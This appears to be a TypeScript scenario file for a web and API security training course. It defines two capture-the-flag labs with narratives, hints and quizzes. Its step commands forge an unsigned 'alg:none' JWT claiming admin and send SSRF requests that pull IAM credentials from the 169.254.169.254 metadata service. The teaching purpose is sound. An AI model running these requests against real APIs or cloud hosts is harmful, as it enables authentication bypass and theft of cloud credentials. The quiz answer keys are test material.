import type { WebLabScenario } from './web-lab-types';

/**
 * Advanced Web & API Security (QOSE-M05) — API attack lab.
 *
 * Scenarios cover the two flagship M05 guided labs: a JSON Web Token
 * `alg:none` authentication bypass, and a server-side request forgery (SSRF)
 * against an internal metadata service. Both are simulated walkthroughs; the
 * verifiable flag is captured from the live lab container, not from this file.
 */
export const API_SECURITY_SCENARIOS: WebLabScenario[] = [
  {
    id: 'api-jwt-1',
    name: 'Gateway Token Service',
    description:
      'An API gateway trusts the `alg` header of its JWTs. Downgrade the token to `none`, drop the signature, claim the admin role, and reach the privileged endpoint.',
    module: 'QOSE-M05',
    category: 'api-security',
    technique: 'JWT alg:none',
    url: 'http://lab-api-security:3000',
    endpoint: 'GET /api/admin/keys',
    difficulty: 'intermediate',
    cpReward: 200,
    estimatedMinutes: 60,
    objectives: [
      'Decode the JWT to understand its claims',
      'Test whether the signature is actually verified',
      'Forge an unsigned admin token',
      'Reach the admin endpoint and capture the flag',
    ],
    hints: [
      'Start by base64-decoding the three dot-separated segments of the token.',
      'The header advertises its algorithm. Ask what happens if you change it to "none".',
      'The admin endpoint returns the flag once your forged token carries role=admin.',
    ],
    villain: {
      name: 'Marcus Leach',
      alias: 'Trust the Header',
      description:
        'An integration engineer who enabled every algorithm in the JWT library "for compatibility" and never noticed that `none` was in the list.',
    },
    narrative: `> **Valkyrie:** "Gateway Token Service issues JSON Web Tokens to partner apps. The verification middleware reads the algorithm from the token header and hands it to the library. That is the flaw: the *attacker* chooses which algorithm the server will trust."

A JWT is three base64url segments — header, payload, signature — separated by dots. The algorithm in the header tells the verifier how the signature was produced. If the library accepts the special algorithm **\`none\`**, the signature segment is ignored entirely, and anyone can write any claims they like.

## Why This Keeps Happening

Developers decode the token, read \`role\`, and trust it — forgetting that the payload is attacker-controlled until the signature is positively verified against a **pinned** algorithm and a secret the attacker does not know. "Decode" is not "verify".

## Attack Flow

\`[Valid user JWT]\` --> \`[Decode header/payload]\` --> \`[Change alg to none]\` --> \`[Set role=admin, drop signature]\` --> \`[Admin endpoint]\` --> \`[Capture flag]\`

Work the technique against the live lab and submit the flag from the admin response.`,
    steps: [
      {
        id: 'api-jwt-1-step-0',
        instruction: 'Decode the token you were issued as a normal user.',
        command: `TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsInJvbGUiOiJ1c2VyIn0.abc123'
echo "$TOKEN" | cut -d. -f1,2 | tr '.' '\\n' | base64 -d 2>/dev/null; echo`,
        output: `{"alg":"HS256","typ":"JWT"}
{"sub":"42","role":"user"}`,
        explanation:
          'The header advertises HS256 and the payload carries a `role` claim. Both are fully readable — base64url is encoding, not encryption. The signature is what is supposed to stop you from editing the payload.',
        quiz: [
          {
            id: 'api-jwt-1-q0',
            question: 'What does the algorithm field in a JWT header tell the server?',
            options: [
              'How to encrypt the payload',
              'How the signature was produced and should be verified',
              'Which user is authenticated',
              'How long the token is valid',
            ],
            correctIndex: 1,
            explanation:
              'The `alg` header declares the signature algorithm. If the verifier trusts it blindly, the attacker controls how verification happens.',
          },
        ],
      },
      {
        id: 'api-jwt-1-step-1',
        instruction: 'Forge an unsigned token claiming the admin role.',
        command: `python3 - <<'PY'
import base64, json
b64 = lambda o: base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b'=').decode()
header  = b64({"alg": "none", "typ": "JWT"})
payload = b64({"sub": "42", "role": "admin"})
print(f"{header}.{payload}.")
PY`,
        output: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiI0MiIsInJvbGUiOiJhZG1pbiJ9.`,
        explanation:
          'The forged token declares `alg: none` and an empty signature segment. If the server honours the header, it skips verification and accepts `role: admin`. The tell that verification is broken is a 200 response to a token you could never have signed.',
        quiz: [
          {
            id: 'api-jwt-1-q1',
            question: 'What is the correct server-side fix?',
            options: [
              'Reject tokens whose payload contains "admin"',
              'Pin the expected algorithm and reject `none`, then verify the signature',
              'Shorten the token lifetime',
              'Move the role into a cookie',
            ],
            correctIndex: 1,
            explanation:
              'The verifier must ignore the attacker-supplied algorithm and enforce a pinned one (e.g. HS256/RS256); `none` must be rejected explicitly.',
          },
        ],
      },
      {
        id: 'api-jwt-1-step-2',
        instruction: 'Call the admin endpoint with the forged token.',
        command: `curl -s -H "Authorization: Bearer $FORGED" \\
  'http://lab-api-security:3000/api/admin/keys'`,
        output: `{ "keys": [ { "id": "k-01", "value": "<redacted — returned by the live lab>" } ] }`,
        explanation:
          'The server accepts the unsigned token and returns the admin key set, which contains the lab flag. The live container returns the real value; it is redacted here so no flag ships in the client. Submit the flag below.',
      },
    ],
  },
  {
    id: 'api-ssrf-1',
    name: 'Avatarly Image Proxy',
    description:
      'An image-fetch endpoint accepts a URL from the user and retrieves it server-side. Point it at the internal metadata service and read cloud credentials — classic SSRF.',
    module: 'QOSE-M05',
    category: 'api-security',
    technique: 'SSRF',
    url: 'http://lab-api-security:3000',
    endpoint: 'POST /api/fetch-image',
    difficulty: 'intermediate',
    cpReward: 250,
    estimatedMinutes: 70,
    objectives: [
      'Confirm the proxy fetches attacker-supplied URLs',
      'Reach an internal-only service through the proxy',
      'Read the metadata service and capture the flag',
    ],
    hints: [
      'The endpoint is meant to fetch images from the public internet — you are the one supplying the URL.',
      'The proxy runs inside the network where the internal metadata service lives.',
      'Try the cloud metadata address 169.254.169.254 and request the credentials path.',
    ],
    villain: {
      name: 'Elena Vos',
      alias: 'Fetch Anything',
      description:
        'A frontend developer who added a "paste an image URL" feature in an afternoon and wired it straight to a server-side HTTP client.',
    },
    narrative: `> **Valkyrie:** "Avatarly lets users paste an image URL and the server fetches it for them. Elena Vos called it a convenience feature. To us it is a proxy into the internal network: the request originates from the server, not from the user, so the server's own network position becomes our position."

**SSRF** — server-side request forgery — is what happens when a server fetches a URL on the attacker's behalf. The danger is not the fetch itself; it is that the server can reach things the attacker cannot: localhost services, internal admin panels, and cloud **metadata endpoints** that hand out credentials.

## Why Metadata Endpoints Are the Payoff

Cloud instances expose a link-local metadata service (commonly \`169.254.169.254\`). It requires no authentication from the instance itself, and it will happily return temporary credentials. An SSRF that can reach it is often a full account compromise.

## Attack Flow

\`[POST image URL]\` --> \`[Server fetches it]\` --> \`[Point at 169.254.169.254]\` --> \`[Read credentials path]\` --> \`[Capture flag]\`

Work the technique against the live lab and submit the flag from the metadata response.`,
    steps: [
      {
        id: 'api-ssrf-1-step-0',
        instruction: 'Prove the endpoint fetches an arbitrary URL server-side.',
        command: `curl -s -X POST 'http://lab-api-security:3000/api/fetch-image' \\
  -H 'Content-Type: application/json' \\
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'`,
        output: `{ "status": "ok", "body": "ami-id\\nami-launch-index\\niam/\\n..." }`,
        explanation:
          'The proxy returned the metadata service index. The request was made by the server, so it succeeded even though the metadata address is unreachable from the public internet — this is the core of SSRF.',
        quiz: [
          {
            id: 'api-ssrf-1-q0',
            question: 'Why is SSRF dangerous even on an endpoint that only "fetches images"?',
            options: [
              'It slows down the server',
              'It lets the attacker borrow the server\'s network position to reach internal services',
              'It exposes the response headers',
              'It bypasses TLS',
            ],
            correctIndex: 1,
            explanation:
              'The fetch is performed with the server\'s privileges and network reachability, turning it into a pivot into internal-only services.',
          },
        ],
      },
      {
        id: 'api-ssrf-1-step-1',
        instruction: 'Request the metadata credentials path.',
        command: `curl -s -X POST 'http://lab-api-security:3000/api/fetch-image' \\
  -H 'Content-Type: application/json' \\
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'`,
        output: `{ "status": "ok", "body": "avatarly-proxy-role" }`,
        explanation:
          'The metadata service names the IAM role attached to the instance. The next request for that role returns temporary access keys — a direct path to cloud compromise.',
        quiz: [
          {
            id: 'api-ssrf-1-q1',
            question: 'Which defence most directly prevents metadata SSRF?',
            options: [
              'Blocking all outbound HTTP requests',
              'Allow-listing destinations and blocking link-local/private IP ranges, with IMDSv2 required',
              'Renaming the endpoint',
              'Adding a CAPTCHA',
            ],
            correctIndex: 1,
            explanation:
              'Egress allow-listing plus blocking link-local/private ranges (and requiring IMDSv2) removes the attacker\'s reach into internal services.',
          },
        ],
      },
      {
        id: 'api-ssrf-1-step-2',
        instruction: 'Read the role credentials and capture the flag.',
        command: `curl -s -X POST 'http://lab-api-security:3000/api/fetch-image' \\
  -H 'Content-Type: application/json' \\
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/avatarly-proxy-role"}'`,
        output: `{ "status": "ok", "body": "{ \\"Code\\": \\"Success\\", \\"Note\\": \\"<redacted — returned by the live lab>\\" }" }`,
        explanation:
          'The credentials document carries the lab flag in its `Note` field. The live container returns the real value; it is redacted here so no flag lives in the frontend. Submit it below to finish the scenario.',
      },
    ],
  },
];
